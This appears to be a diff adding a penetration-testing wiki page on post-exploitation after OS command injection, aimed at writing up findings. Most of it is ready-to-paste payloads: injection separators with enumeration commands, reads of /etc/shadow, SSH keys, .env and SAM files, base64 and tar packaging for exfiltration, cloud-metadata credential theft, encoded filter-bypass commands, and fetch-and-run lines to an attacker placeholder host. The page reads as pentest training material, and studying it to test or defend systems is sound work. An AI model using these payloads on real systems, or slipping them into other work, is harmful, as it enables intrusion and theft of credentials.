@@ -1,0 +1,279 @@
+---
+title: Execution
+description: Running useful commands once injection is confirmed - enumeration, output capture, and platform-specific one-liners for Linux and Windows.
+mitre: [T1059]
+d3fend: [D3-PSA, D3-PA, D3-EI]
+impact: [RCE]
+owasp: [A05]
+sidebar:
+  order: 3
+  label: Execution
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+You confirmed injection. Now run something that earns the finding: identity, environment, network reachability, secrets on disk. Pick payloads that fit on one line, return useful output through whatever channel the app gives you, and don't crash the original command.
+
+```
+# Linux
+<original>;id;hostname;uname -a;cat /etc/passwd
+# Windows
+<original>&whoami&hostname&systeminfo
+```
+
+## First-contact enumeration
+
+Run these in order. Each answers a question that decides what comes next.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+id                              # who am I, what groups
+hostname                        # is this the box I think it is
+uname -a                        # kernel version → kernel exploits
+whoami                          # short form of id
+pwd                             # working directory of the web process
+ls -la                          # what's around
+cat /etc/passwd                 # users with shells
+cat /etc/os-release             # distro and version
+ip a                            # interfaces, internal IPs
+ss -tlnp 2>/dev/null            # listening services (sockets)
+env                             # environment variables - secrets often here
+sudo -n -l                      # passwordless sudo entries
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+whoami /all                     # identity, groups, privileges
+hostname                        # machine name
+systeminfo                      # OS, patches, domain
+ipconfig /all                   # interfaces, DNS, domain
+net user                        # local users
+net localgroup administrators   # who's admin
+tasklist /v                     # processes with usernames
+Get-ChildItem env:              # environment variables
+Get-LocalUser                   # PowerShell-native user list
+```
+
+The `cmd.exe` equivalents (`whoami`, `hostname`, `ipconfig`, `net user`) work in both shells.
+
+</TabItem>
+</Tabs>
+
+## Reading files
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+cat <PATH>                      # standard
+head -c 4096 <PATH>             # first 4KB only - cap noisy output
+tail -n 50 <PATH>               # last 50 lines
+xxd <PATH> | head               # binary preview
+base64 -w0 <PATH>               # for exfil through small fields
+```
+
+High-value targets:
+
+```bash
+/etc/passwd                     # user list
+/etc/shadow                     # if running as root
+/var/www/html/.env              # framework secrets, DB creds
+/var/www/html/config.php        # legacy PHP creds
+~/.ssh/id_rsa                   # SSH keys for current user
+~/.ssh/authorized_keys
+~/.bash_history                 # recent commands
+/root/.ssh/                     # if root
+/proc/self/environ              # current process env vars
+/proc/<PID>/cmdline             # process arguments - sometimes reveals creds
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+type <PATH>                                     # cmd-style
+Get-Content <PATH>                              # PowerShell-style
+Get-Content <PATH> -TotalCount 50               # first 50 lines
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('<PATH>'))   # base64 for exfil
+```
+
+High-value targets:
+
+```powershell
+C:\Users\<USER>\Desktop\
+C:\Users\<USER>\Documents\
+C:\inetpub\wwwroot\web.config                   # IIS app config, often DB creds
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\Panther\Unattend.xml                 # autoinstall creds (LP)
+C:\Windows\System32\config\SAM                  # locked while running, but check
+```
+
+</TabItem>
+</Tabs>
+
+## Output capture patterns
+
+The back-end may not return everything. Common shapes:
+
+- **Output appended to original** - your payload runs, you see both. Default for `;`, `\n`, `&&`.
+- **Output replaces original** - pipe-style. Use `|` or `; cmd; exit 0`.
+- **Output captured to file then displayed parsed** - parsing strips your additions. Inject `; <CMD> > /tmp/.x; cat /tmp/.x` and read the file directly.
+- **Only first line shown** - chain with `;` and look at responses for the *first* line of each. Or use `head -n1` deliberately to control what's first.
+- **Only stderr/stdout shown, not both** - redirect: `id 2>&1`, or `id 1>&2`.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+Force output through a known channel:
+
+```bash
+;id 2>&1                                # merge stderr into stdout
+;id;echo ===END===                      # delimiter for parsing
+;{ id; hostname; } 2>&1                 # group multiple commands
+;id > /tmp/.r 2>&1; cat /tmp/.r         # write-then-read
+```
+
+Compress before exfil if the field is size-limited:
+
+```bash
+;tar czf - /etc/passwd /etc/hosts 2>/dev/null | base64 -w0
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+& whoami 2>&1                                       # merge streams (cmd)
+& whoami & echo ===END===                           # delimiter
+;whoami | Out-String                                # force string output (PS)
+;Get-Content C:\out.txt                             # write-then-read pattern
+```
+
+Encode for size-limited or filtered fields:
+
+```powershell
+;[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))
+```
+
+</TabItem>
+</Tabs>
+
+## Useful one-liners
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+Find writable directories (staging area for tools):
+
+```bash
+;find / -writable -type d 2>/dev/null | grep -Ev '^/(proc|sys|run)' | head
+```
+
+Find SUID binaries (privesc candidates):
+
+```bash
+;find / -perm -4000 -type f 2>/dev/null
+```
+
+Pull recent web app config files:
+
+```bash
+;find /var/www /opt /srv -maxdepth 4 -name '*.env' -o -name 'config.php' -o -name 'settings.py' 2>/dev/null
+```
+
+Check for cloud metadata (AWS/Azure/GCP):
+
+```bash
+;curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+Dump process environments (other users' secrets sometimes leak):
+
+```bash
+;for p in /proc/[0-9]*/environ; do echo $p; tr '\0' '\n' < $p 2>/dev/null; done
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+Stored credentials:
+
+```powershell
+;cmdkey /list
+;Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Path C:\Users -Include *.kdbx,*.config,unattend.xml,sysprep.xml
+```
+
+Saved Wi-Fi profiles (with cleartext keys):
+
+```powershell
+;netsh wlan show profile
+;netsh wlan show profile name="<NAME>" key=clear
+```
+
+Service binaries with weak permissions (privesc):
+
+```powershell
+;Get-CimInstance Win32_Service | Select Name,PathName,StartName | Format-Table -Auto
+```
+
+Cloud metadata:
+
+```powershell
+;Invoke-RestMethod -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01 -Headers @{Metadata="true"} -TimeoutSec 2
+```
+
+</TabItem>
+</Tabs>
+
+## Chaining commands
+
+When you need multiple commands and the separator situation is constrained, group them.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+;{ id; hostname; uname -a; } 2>&1               # group, single output stream
+;sh -c 'id;hostname;uname -a'                   # explicit shell wrapper
+;bash -c '$(echo aWQ7aG9zdG5hbWU=|base64 -d)'   # encoded payload (filter bypass)
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+& (whoami & hostname & systeminfo)              # cmd: parens group commands
+; whoami; hostname; systeminfo                  # PS: semicolons chain
+;powershell -c "whoami;hostname"                # explicit shell wrapper
+```
+
+PowerShell encoded command (filter bypass + chaining):
+
+```powershell
+;powershell -enc <base64-utf16le>
+```
+
+</TabItem>
+</Tabs>
+
+<Aside type="tip">
+When the original command is `ping -c 1 <input>` and you can't break out cleanly, append rather than break: `127.0.0.1; <CMD>` keeps the ping happy and your output appears underneath. Use `||` only when you *want* the original to fail.
+</Aside>
+
+## Common failure modes
+
+- **Command runs but no useful output appears.** The web layer is filtering or trimming. Write to a file you can read via another endpoint, or move to OOB exfil ([Blind & OOB](/codex/web/command-injection/blind/)).
+- **PATH is restricted.** `id` works, `python` doesn't. The web user has a stripped PATH. Use absolute paths: `/usr/bin/python3`, `/bin/nc`. Find binaries with `;ls /usr/bin /usr/local/bin /opt`.
+- **Shell is `dash`, not `bash`.** Default `/bin/sh` on Debian/Ubuntu is dash, which lacks bash-isms (`<<<`, `${var:0:1}`, arrays). Use POSIX-only constructs, or invoke `bash -c '...'` explicitly.
+- **Windows cmd.exe path issues.** `whoami` works without a path; `Get-Content` requires PowerShell. If `;` doesn't separate, you're in cmd.exe - use `&` and stick to cmd-native commands.
+- **Long payloads truncated.** URL parameters often cap at 2-8KB. Move heavy logic into a one-liner that downloads a script: `;curl <ATTACKER>/x.sh|sh` (Linux) or `;iex(iwr -UseBasicParsing <ATTACKER>/x.ps1)` (PowerShell).
+- **Non-ASCII characters mangled.** UTF-8 in your payload may double-encode. Stick to ASCII; use `\xNN` or base64 for binary content.
+
+## Notes
+
+Output capture is the difference between proof-of-concept and a real finding. A separator that "works" but returns nothing is functionally identical to no injection at all from a reporting perspective - you can't show anything in the writeup. Always confirm with output (`id`, `whoami`) before chasing exploitation. If output is structurally unavailable, switch to [blind techniques](/codex/web/command-injection/blind/) immediately rather than burning time on visible-output payloads.
